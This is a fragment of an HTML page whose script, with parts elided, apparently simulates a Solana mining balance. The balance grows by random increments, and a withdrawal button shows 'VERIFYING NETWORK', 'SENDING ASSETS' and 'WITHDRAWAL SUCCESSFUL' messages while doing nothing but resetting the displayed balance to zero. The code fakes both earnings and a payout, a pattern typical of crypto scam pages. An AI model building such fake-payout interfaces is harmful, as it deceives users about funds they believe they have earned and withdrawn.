    ...
    <body>
        ...
        <script>
            ...
            function startEngine() {
                ...
                setInterval(() => {
                    let increment = (Math.random() * 0.04) + 0.01;
            ...
            function runWithdraw() {
                ...
                if(addr.length < 10) { alert("INVALID WALLET ADDRESS"); return; }
                btn.innerHTML = "VERIFYING NETWORK...";
                btn.style.background = "#00d2ff";
                setTimeout(() => {
                    btn.innerHTML = "SENDING ASSETS...";
                    btn.style.background = "#ffcc00";
                    setTimeout(() => {
                        currentBal = 0;
                        document.getElementById('sol-balance').innerHTML = "0.00 SOL";
                        btn.innerHTML = "WITHDRAWAL SUCCESSFUL";
